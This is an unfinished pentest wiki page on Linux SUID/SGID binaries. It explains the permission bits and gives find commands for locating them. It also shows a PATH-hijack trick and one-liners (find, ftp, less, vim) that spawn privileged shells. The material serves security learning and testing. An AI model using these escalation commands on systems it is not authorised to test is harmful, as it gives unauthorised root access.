# 🛠️ SUID/SGID binaries

{% hint style="danger" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

Just like other linux files, binaries have permissions. Due to obligation or misconfiguration, some of them run with higher privileges than usual and can therefore be targeted in priority when trying to locally escalate privileges on a machine.

#### SUID binaries

The SUID bit allows the binary to run with the privileges of the owner instead of those of the user executing it. They can be spotted to the `s` permission in the file owner permissions \(i.e. files with permissions `-rws...`\).

{% hint style="info" %}
Note that if the permission is listed with a capital `S` such as `-rwS...`, the file is suid-enabled but not executable...
{% endhint %}

```bash
# List all the root suid-enabled running binaries on the machine (and variants)
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -user root -perm -4000 -print 2>/dev/null
```

In this command, replace `/` with the directory you want to search, `f` indicates that only regular files \(ie not directories, special files\) will be listed.

Once the SUID binaries listed, you can try and exploit them. If you find in the list a well known linux command, you can check if it is exploitable on [GTFOBins](https://gtfobins.github.io/#+sudo).

You can set the SUID bit on a file like this :

```bash
# Set SUID bit to file
sudo chmod u+s file
```

#### SGID binaries

The same principles apply to SGID binaries. They can be spotted by the `s` permission in the file group permission \(ie files with the permissions `-...rws...`\).

 Set special group permission on a file :

```bash
# Set SGID bit to file
sudo chmod g+s file
```

#### Limitations

* Just like capabilities, SUID and GUID bits are cleared when a file is copied with `cp`.
* Some partitions of the linux file system are mounted with the `nosuid` option. In this case the SUID bit is ignored for binaries placed inside the partition. It is a common good practice for tmpfs partitions like `/tmp` or`/run`. You can spot these partitions  by inspecting the `/proc/mounts` pseudo-file for a `nosuid` flag. 

## Practice

#### Relative path calls

If a SUID binary calls to another one using a relative path instead of absolute.

```c
int function(int argc, char *argv[]){
···
    system("cat") // instead of system("/usr/bin/cat")
···
}
```

You can add a `cat` binary to the current working directory and edit the `PATH` environment variable so it is found first : `PATH=.:$PATH`

#### Common SUID privilege escalation

Known binaries that allow command execution and can be exploited :

```text
find -exec sh -p \; -quit

ftp
>!sh -p

less
>!sh -p

# Apparently system-dependent
vim -c ':!sh -p'
```

## References

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/" caption="" %}

